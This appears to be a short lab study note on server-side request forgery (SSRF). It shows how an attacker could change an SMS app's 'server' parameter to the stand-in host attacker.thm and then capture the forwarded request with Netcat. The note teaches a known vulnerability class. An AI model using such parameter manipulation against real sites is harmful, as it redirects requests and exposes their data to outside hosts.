## SSRF practical
![[owasp7.png]]
By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider.

**To achieve this, the attacker would only need to make the following request to your website:**
```python
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

**This would make the vulnerable web application make a request to:**
```python
https://attacker.thm/api/send?msg=ABC
```

**You could then just capture the contents of the request using Netcat:**
![[owasp8.png]]
